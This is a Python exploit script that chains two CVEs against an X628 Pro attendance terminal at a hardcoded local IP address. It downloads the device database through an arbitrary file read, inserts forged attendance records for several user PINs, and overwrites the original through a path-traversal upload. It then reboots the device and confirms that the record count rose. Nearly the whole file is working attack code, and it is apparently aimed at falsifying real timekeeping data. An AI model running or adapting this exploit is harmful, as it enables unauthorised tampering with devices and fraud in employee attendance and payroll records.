#!/usr/bin/env python3
"""
CVE-2023-3941 + 3940: FULL E2E ATTLOG INJECTION.
1. Download current ZKDB.db via READFILE 0x6A6 (CVE-2023-3940)
2. Inject ATTLOG records via SQLite INSERT
3. Upload back via UPLOAD_PICTURE 0x272B path traversal (CVE-2023-3941)
4. Reboot device
5. Verify ATTLOG count went up
"""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, sqlite3, os, shutil, tempfile
from datetime import datetime
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
TEMP_DIR = 'D:\\chamcong\\zk_inject_workspace'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_via_picture(conn, target_path, data):
    """CVE-2023-3941 UPLOAD_PICTURE with path traversal."""
    parts = target_path.split('/')
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "/".join(parts)
    filename = traversal.encode() + b'\x00'
    size = len(data)

    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'):
        return {'error': 'PREPARE_DATA failed', 'result': r1}
    MAX_CHUNK = 1024
    remain = size % MAX_CHUNK
    packets = (size - remain) // MAX_CHUNK
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, data[i*MAX_CHUNK:(i+1)*MAX_CHUNK])
        if not r.get('status'):
            return {'error': 'DATA chunk failed', 'result': r}
    if remain:
        r = send_cmd(conn, const.CMD_DATA, data[packets*MAX_CHUNK:])
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3}

def download_zkdb(conn, output_path):
    """CVE-2023-3940 READFILE ZKDB.db."""
    sock = conn._ZK__sock
    print('  Initiating READFILE ZKDB.db...')
    r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/ZKDB.db\x00')
    print('  Initial response:', r)

    sock.settimeout(15)
    total = b''
    chunks = 0
    while True:
        try:
            chunk = sock.recv(65536)
            if not chunk: break
            if len(chunk) >= 16:
                top1, top2, tcp_len = unpack('<HHI', chunk[:8])
                if tcp_len == 0:
                    break
                zk_cmd = unpack('<H', chunk[8:10])[0]
                body = chunk[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
                total += body
                chunks += 1
                if zk_cmd == 0x07D0 or zk_cmd == 2000:
                    break
                if chunks > 5000:
                    break
        except socket.timeout:
            break
    print('  Total chunks: {}'.format(chunks))
    print('  Total data: {} bytes'.format(len(total)))
    with open(output_path, 'wb') as f:
        f.write(total)
    return total

def main():
    print('=' * 60)
    print('CVE-2023-3941 + CVE-2023-3940')
    print('REMOTE ATTLOG INJECTION ON X628 PRO FW 6.60')
    print('=' * 60)

    os.makedirs(TEMP_DIR, exist_ok=True)

    zk = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
    try:
        conn = zk.connect()
    except Exception as e:
        print('[!] Connect failed:', e)
        return

    print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

    # === Step 1: Get current ATTLOG count ===
    try:
        before_count = conn.get_attendance_count()
        print('[*] ATTLOG count BEFORE: {}'.format(before_count))
    except Exception as e:
        before_count = None
        print('  Count failed:', e)

    try:
        conn.disable_device()
        print('[+] Device disabled')
    except: pass

    # === Step 2: Download current ZKDB.db ===
    print('\n[*] Downloading current ZKDB.db via CVE-2023-3940...')
    zkdb_local = os.path.join(TEMP_DIR, 'current_zkdb.db')
    data = download_zkdb(conn, zkdb_local)

    if not data or data[:15] != b'SQLite format 3':
        print('[!] Download failed or invalid SQLite')
        return

    print('[+] Got {} bytes'.format(len(data)))

    # === Step 3: Inject ATTLOG records ===
    print('\n[*] Injecting ATTLOG records...')
    try:
        db = sqlite3.connect(zkdb_local)
        cur = db.cursor()
        # Get schema
        cur.execute("SELECT sql FROM sqlite_master WHERE name='ATT_LOG'")
        schema = cur.fetchone()
        print('  ATT_LOG schema:', schema[0][:200] if schema else 'NOT FOUND')

        # Inject multiple records for testing
        test_pins = ['1', '47', '1383', '9999']
        test_time = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
        for pin in test_pins:
            cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                          VALUES (?, 1, ?, 0, 0, 0, 0, NULL, NULL, 0)''', (pin, test_time))
            print('  Injected: PIN={} Time={}'.format(pin, test_time))

        cur.execute('SELECT COUNT(*) FROM ATT_LOG')
        new_count = cur.fetchone()[0]
        print('  ATT_LOG count: {} -> {}'.format(before_count, new_count))
        db.commit()
        db.close()
    except Exception as e:
        print('[!] Inject failed:', e)
        return

    # Read modified DB
    with open(zkdb_local, 'rb') as f:
        modified_data = f.read()
    print('[*] Modified DB: {} bytes'.format(len(modified_data)))

    # === Step 4: Upload modified DB back via CVE-2023-3941 ===
    print('\n[*] Uploading modified ZKDB.db via CVE-2023-3941...')
    print('  WARNING: This will overwrite the device ZKDB.db!')
    result = upload_via_picture(conn, 'mnt/mtdblock/data/ZKDB.db', modified_data)
    print('  Result:', result)

    time.sleep(2)

    # === Step 5: Verify file written ===
    print('\n[*] Verifying file written...')
    r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/ZKDB.db\x00')
    print('  READFILE ZKDB.db:', r)

    # === Step 6: Reboot device ===
    print('\n[*] Rebooting device to apply changes...')
    try:
        conn.restart()
        print('  [+] Restart command sent')
    except Exception as e:
        print('  [!] Restart:', e)

    try:
        conn.enable_device()
    except: pass
    try:
        conn.disconnect()
    except: pass

    # === Step 7: After reboot, reconnect and verify ===
    print('\n[*] Waiting 15s for device reboot...')
    time.sleep(15)

    try:
        zk2 = ZK(DEVICE_IP, port=4370, timeout=10, password=0)
        conn2 = zk2.connect()
        print('[+] Reconnected after reboot')
        after_count = conn2.get_attendance_count()
        print('[*] ATTLOG count AFTER: {}'.format(after_count))
        if before_count is not None and after_count > before_count:
            print('\n[+] ATTLOG INJECTION SUCCESS! Delta: +{}'.format(after_count - before_count))
        conn2.disconnect()
    except Exception as e:
        print('[!] Reconnect failed:', e)

    print('\n[+] Done')

if __name__ == '__main__':
    main()
